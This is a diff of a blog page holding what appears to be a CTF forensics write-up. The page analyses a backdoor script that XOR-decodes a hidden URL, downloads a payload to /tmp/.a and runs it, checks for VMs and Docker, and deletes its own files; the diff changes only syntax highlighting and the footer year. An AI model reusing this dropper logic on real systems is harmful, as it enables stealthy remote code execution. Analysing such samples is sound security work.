@@ -135,34 +135,34 @@ Our plaintext is not only DS.jpeg because in the zip file, DS.jpeg is compressed
 </span><span class=lnt>25
 </span></code></pre></td>
 <td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-txt data-lang=txt>def is_inside_linux():
-    return os.name == &#39;posix&#39;
+<pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=k>def</span> <span class=nf>is_inside_linux</span><span class=p>():</span>
+    <span class=k>return</span> <span class=n>os</span><span class=o>.</span><span class=n>name</span> <span class=o>==</span> <span class=s1>&#39;posix&#39;</span>
 
-# Some code ...
+<span class=c1># Some code ...</span>
 
-def load_p2():
-	key = (os.name + getuser() + sys.argv[1]).encode() # Пароль для zip-файла
-	address = [47,7,7,29,8,72,64,64,65,98,91,66,84,66,27,124,116,102,25,6,3,12,95,28,7,8,12,27,12,64,7,38,5,21,23,31,84,33,51,49,69,82,24,93,8,10]
-	addr = xor(key, address)
-	if addr[1:5] == &#34;http&#34;:
-		r = requests.get(addr[1:]) # Add password or some shit to download it bruh
-		with open(&#34;/tmp/.a&#34;, &#34;wb&#34;) as f:
-			f.write(r.content)
-		subprocess.Popen([&#34;/tmp/.a&#34;, detach=True])
+<span class=k>def</span> <span class=nf>load_p2</span><span class=p>():</span>
+	<span class=n>key</span> <span class=o>=</span> <span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>name</span> <span class=o>+</span> <span class=n>getuser</span><span class=p>()</span> <span class=o>+</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span> <span class=c1># Пароль для zip-файла</span>
+	<span class=n>address</span> <span class=o>=</span> <span class=p>[</span><span class=mi>47</span><span class=p>,</span><span class=mi>7</span><span class=p>,</span><span class=mi>7</span><span class=p>,</span><span class=mi>29</span><span class=p>,</span><span class=mi>8</span><span class=p>,</span><span class=mi>72</span><span class=p>,</span><span class=mi>64</span><span class=p>,</span><span class=mi>64</span><span class=p>,</span><span class=mi>65</span><span class=p>,</span><span class=mi>98</span><span class=p>,</span><span class=mi>91</span><span class=p>,</span><span class=mi>66</span><span class=p>,</span><span class=mi>84</span><span class=p>,</span><span class=mi>66</span><span class=p>,</span><span class=mi>27</span><span class=p>,</span><span class=mi>124</span><span class=p>,</span><span class=mi>116</span><span class=p>,</span><span class=mi>102</span><span class=p>,</span><span class=mi>25</span><span class=p>,</span><span class=mi>6</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>12</span><span class=p>,</span><span class=mi>95</span><span class=p>,</span><span class=mi>28</span><span class=p>,</span><span class=mi>7</span><span class=p>,</span><span class=mi>8</span><span class=p>,</span><span class=mi>12</span><span class=p>,</span><span class=mi>27</span><span class=p>,</span><span class=mi>12</span><span class=p>,</span><span class=mi>64</span><span class=p>,</span><span class=mi>7</span><span class=p>,</span><span class=mi>38</span><span class=p>,</span><span class=mi>5</span><span class=p>,</span><span class=mi>21</span><span class=p>,</span><span class=mi>23</span><span class=p>,</span><span class=mi>31</span><span class=p>,</span><span class=mi>84</span><span class=p>,</span><span class=mi>33</span><span class=p>,</span><span class=mi>51</span><span class=p>,</span><span class=mi>49</span><span class=p>,</span><span class=mi>69</span><span class=p>,</span><span class=mi>82</span><span class=p>,</span><span class=mi>24</span><span class=p>,</span><span class=mi>93</span><span class=p>,</span><span class=mi>8</span><span class=p>,</span><span class=mi>10</span><span class=p>]</span>
+	<span class=n>addr</span> <span class=o>=</span> <span class=n>xor</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>address</span><span class=p>)</span>
+	<span class=k>if</span> <span class=n>addr</span><span class=p>[</span><span class=mi>1</span><span class=p>:</span><span class=mi>5</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;http&#34;</span><span class=p>:</span>
+		<span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>addr</span><span class=p>[</span><span class=mi>1</span><span class=p>:])</span> <span class=c1># Add password or some shit to download it bruh</span>
+		<span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;/tmp/.a&#34;</span><span class=p>,</span> <span class=s2>&#34;wb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
+			<span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>content</span><span class=p>)</span>
+		<span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>([</span><span class=s2>&#34;/tmp/.a&#34;</span><span class=p>,</span> <span class=n>detach</span><span class=o>=</span><span class=kc>True</span><span class=p>])</span>
 	
 
-if __name__ == &#34;__main__&#34;:
-    load_p2()
-    if len(sys.argv) == 2 and is_inside_linux() and not is_inside_docker() and not is_inside_vm() and has_internet_access():
-    	print(&#34;It works !&#34;)
-    else:
-    	try:
-    		subprocess.check_output([&#39;rm&#39;,&#39;tool_retriever.py&#39;,&#39;SuperUltraTech30001.zip&#39;])
-    	except subprocess.CalledProcessError:
-    		pass</code></pre></td></tr></table>
+<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+    <span class=n>load_p2</span><span class=p>()</span>
+    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>==</span> <span class=mi>2</span> <span class=ow>and</span> <span class=n>is_inside_linux</span><span class=p>()</span> <span class=ow>and</span> <span class=ow>not</span> <span class=n>is_inside_docker</span><span class=p>()</span> <span class=ow>and</span> <span class=ow>not</span> <span class=n>is_inside_vm</span><span class=p>()</span> <span class=ow>and</span> <span class=n>has_internet_access</span><span class=p>():</span>
+    	<span class=nb>print</span><span class=p>(</span><span class=s2>&#34;It works !&#34;</span><span class=p>)</span>
+    <span class=k>else</span><span class=p>:</span>
+    	<span class=k>try</span><span class=p>:</span>
+    		<span class=n>subprocess</span><span class=o>.</span><span class=n>check_output</span><span class=p>([</span><span class=s1>&#39;rm&#39;</span><span class=p>,</span><span class=s1>&#39;tool_retriever.py&#39;</span><span class=p>,</span><span class=s1>&#39;SuperUltraTech30001.zip&#39;</span><span class=p>])</span>
+    	<span class=k>except</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>CalledProcessError</span><span class=p>:</span>
+    		<span class=k>pass</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>Here are the 3 useful functions, backdoor file is located at a url, and this address is xor with key. We can found this key like this :</p>
+</div><p>Here are the 3 useful functions, backdoor file is located at a url, and this address is xor with key. We can found this key like this :</p>
 <ul>
 <li>os.name -> <code>posix</code> (main condition)</li>
 <li>getuser() -> <code>root</code> (load_p2 condition)</li>
@@ -193,7 +193,7 @@ We need to find password which enable this backdoor, and challenge title contain
 </article>
 </main>
 <footer class=footer>
-<span>&copy; 2024 <a href=https://xelon-coder.github.io/Sirius14_Blog/>Sirius14 Blog</a></span>
+<span>&copy; 2025 <a href=https://xelon-coder.github.io/Sirius14_Blog/>Sirius14 Blog</a></span>
 <span>
 Powered by
 <a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
